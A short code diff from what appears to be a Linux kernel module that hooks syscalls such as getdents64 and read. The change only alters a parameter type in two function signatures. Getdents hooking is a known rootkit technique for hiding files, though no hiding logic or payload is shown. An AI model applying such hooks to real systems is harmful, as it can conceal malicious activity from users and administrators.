@@ -108,7 +108,7 @@ typedef struct _linux_dirent64 { // https://man7.org/linux/man-pages/man2/getden
 
 typedef ssize_t (*ksys_read_func)(unsigned int fd, char __user* buf, size_t count);
 typedef long    (*ksys_getdents_func)(unsigned int fd, struct linux_dirent __user* dirp,unsigned int count);
-typedef ssize_t (*ksys_getdents64_func)(int fd, struct linux_dirent64 __user* dirp, size_t count); // void* dirp
+typedef ssize_t (*ksys_getdents64_func)(int fd, struct linux_dirent64 __user* dirp, unsigned int count); // void* dirp
 
 typedef struct  _hook_s {
     unsigned int index;
@@ -173,7 +173,7 @@ int alpine_ksys_getdents(unsigned int fd,struct linux_dirent __user* dirent, uns
 /** __NR_getdents64
  *
  */
-int alpine_ksys_getdents64(unsigned int fd,struct linux_dirent64 __user* dirent, size_t count){
+int alpine_ksys_getdents64(unsigned int fd,struct linux_dirent64 __user* dirent, unsigned int count){
     echo("getdents64\n");
     /*
     struct thread_info* ti = 0;
